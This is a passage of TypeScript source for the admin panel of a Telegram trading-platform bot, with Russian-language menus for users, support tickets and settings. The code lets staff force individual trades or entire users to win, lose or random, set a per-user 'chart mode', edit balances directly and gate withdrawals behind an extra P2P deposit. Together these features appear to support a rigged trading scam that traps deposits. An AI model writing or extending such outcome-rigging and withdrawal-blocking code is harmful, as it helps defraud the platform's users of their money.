        { text: `🟢 WIN ${t.pairId.slice(0, 10)}`, callback_data: `adm:tr:win:${t.id}` },
        { text: '🔴 LOSE', callback_data: `adm:tr:lose:${t.id}` },
      ],
    ]);
    rows.push([{ text: '🔄', callback_data: 'adm:trades' }, { text: '« Меню', callback_data: 'adm:menu' }]);
    await this.edit(chatId, messageId, lines.join('\n'), rows);
  }

  private async showUsers(chatId: number, messageId: number) {
    const { items, total } = await this.trades.adminListUsers(12, 0);
    const lines = [
      `👥 <b>Юзеры</b> (${total})`,
      ...items.map(
        (u, i) =>
          `${i + 1}. <code>${u.username}</code> · ${u.balance} · ${u.outcomeMode}${u.tradeLocked ? ' 🔒' : ''}`,
      ),
    ];
    const rows: InlineBtn[][] = items.map((u) => [
      { text: `⚙ ${u.username.slice(0, 18)}`, callback_data: `adm:ud:${u.id}` },
    ]);
    rows.push([{ text: '« Меню', callback_data: 'adm:menu' }]);
    await this.edit(chatId, messageId, lines.join('\n'), rows);
  }

  private async showUser(chatId: number, messageId: number, userId: string) {
    const st = await this.trades.adminUserStats(userId).catch(() => null);
    const u = await this.prisma.user.findUnique({
      where: { id: userId },
      select: {
        id: true,
        username: true,
        displayName: true,
        outcomeMode: true,
        tradeLocked: true,
        kycRequired: true,
        tradingCurrency: true,
        telegramId: true,
        loggingEnabled: true,
        withdrawRequireCardDeposit: true,
        kycStatus: true,
      },
    });
    if (!u) {
      await this.edit(chatId, messageId, 'Не найден', [[{ text: '«', callback_data: 'adm:users' }]]);
      return;
    }
    const bals = st?.balances?.map((b) => `${b.available} ${b.currency}`).join(', ') ?? '—';
    const s = st?.stats;
    const kycLabel =
      u.kycStatus === 'APPROVED'
        ? '✅ пройдена'
        : u.kycStatus === 'PENDING'
          ? '⏳ на проверке'
          : u.kycStatus === 'REJECTED'
            ? '❌ отклонена'
            : 'не пройдена';
    const text = [
      `👤 <b>${u.displayName || u.username}</b>`,
      `<code>${u.username}</code>`,
      `Режим графика: <b>${u.outcomeMode}</b>`,
      `Лок: ${u.tradeLocked ? '🔒' : '🔓'} · KYC req: ${u.kycRequired ? 'да' : 'нет'}`,
      `Верификация: <b>${kycLabel}</b>`,
      `Вывод: ${u.withdrawRequireCardDeposit ? 'нужен P2P-депозит' : 'без ограничения'}`,
      `Балансы: ${bals}`,
      s ? `Сделки: open ${s.open} · W ${s.won} · L ${s.lost} · PnL ${s.realizedPnl}` : '',
      u.telegramId ? `TG: <code>${u.telegramId}</code>` : '',
    ]
      .filter(Boolean)
      .join('\n');
    await this.edit(chatId, messageId, text, [
      [
        { text: 'WIN', callback_data: `adm:u:win:${userId}` },
        { text: 'LOSE', callback_data: `adm:u:lose:${userId}` },
        { text: 'RND', callback_data: `adm:u:rnd:${userId}` },
      ],
      [
        {
          text: u.tradeLocked ? '🔓 Unlock' : '🔒 Lock',
          callback_data: `adm:u:${u.tradeLocked ? 'ulock' : 'lock'}:${userId}`,
        },
        { text: 'KYC lock', callback_data: `adm:u:kyc:${userId}` },
      ],
      [
        {
          text: u.kycStatus === 'APPROVED' ? '✅ KYC выдана' : '✅ Выдать KYC',
          callback_data: `adm:u:kycok:${userId}`,
        },
      ],
      [
        {
          text: u.withdrawRequireCardDeposit ? '🔓 Вывод: OFF gate' : '🔐 Вывод: ON gate',
          callback_data: `adm:u:${u.withdrawRequireCardDeposit ? 'wdoff' : 'wdon'}:${userId}`,
        },
      ],
      [
        { text: '💵 Баланс =', callback_data: `adm:u:bal:${userId}` },
        { text: '± Дельта', callback_data: `adm:u:adj:${userId}` },
      ],
      [{ text: '✉ Сообщение', callback_data: `adm:u:msg:${userId}` }],
      [{ text: '« Юзеры', callback_data: 'adm:users' }, { text: 'Меню', callback_data: 'adm:menu' }],
    ]);
  }

  private async showSupport(chatId: number, messageId: number) {
    const tickets = await this.support.listOpenTickets();
    const top = tickets.slice(0, 10);
    const lines = [
      '💬 <b>Поддержка</b>',
      top.length ? '' : 'Пусто',
      ...top.map((t, i) => {
        const last = t.messages[0]?.body?.slice(0, 50) ?? '—';
        return `${i + 1}. @${t.user.username}: ${last}`;
      }),
    ].filter(Boolean);
    const rows: InlineBtn[][] = top.map((t) => [
      { text: `✉ ${t.user.username.slice(0, 18)}`, callback_data: `adm:sd:${t.id}` },
    ]);
    rows.push([{ text: '🔄', callback_data: 'adm:sup' }, { text: '« Меню', callback_data: 'adm:menu' }]);
    await this.edit(chatId, messageId, lines.join('\n'), rows);
  }

  private async showTicket(chatId: number, messageId: number, ticketId: string) {
    const t = await this.support.getTicketAdmin(ticketId);
    const msgs = t.messages
      .slice(-8)
      .map((m) => `${m.isStaff ? '🛠' : '👤'} ${m.body.slice(0, 200)}`)
      .join('\n');
    await this.edit(chatId, messageId, `💬 @${t.user.username}\n\n${msgs || 'Нет сообщений'}`, [
      [{ text: '✍ Ответить', callback_data: `adm:sr:${ticketId}` }],
      [{ text: '« Тикеты', callback_data: 'adm:sup' }, { text: 'Меню', callback_data: 'adm:menu' }],
    ]);
  }

  private async showSettings(chatId: number, messageId: number) {
    const [req, payout, lim] = await Promise.all([
      this.trades.getDepositRequisites(),
      this.trades.getPayoutCoef(),
      this.limits.getAll(),
    ]);
    const text = [
      '⚙ <b>Настройки</b>',
      `Payout: <b>${payout}</b>`,
      `Мин. депозит: <b>${lim.minDeposit}</b>`,
      `Мин. вывод: <b>${lim.minWithdrawal}</b>`,
      `Мин. сделка: <b>${lim.minTrade}</b>`,
      `Глобальные реквизиты:\n<pre>${(req || '—').slice(0, 350)}</pre>`,
    ].join('\n');
    await this.edit(chatId, messageId, text, [
      [{ text: '💳 Изменить реквизиты', callback_data: 'adm:set:req' }],
      [{ text: '📈 Изменить payout', callback_data: 'adm:set:pay' }],
      [{ text: '↓ Мин. депозит', callback_data: 'adm:set:mindep' }],
      [{ text: '↑ Мин. вывод', callback_data: 'adm:set:minwd' }],
      [{ text: '💱 Мин. сделка', callback_data: 'adm:set:mintr' }],
      [{ text: '« Меню', callback_data: 'adm:menu' }],
    ]);
  }
}
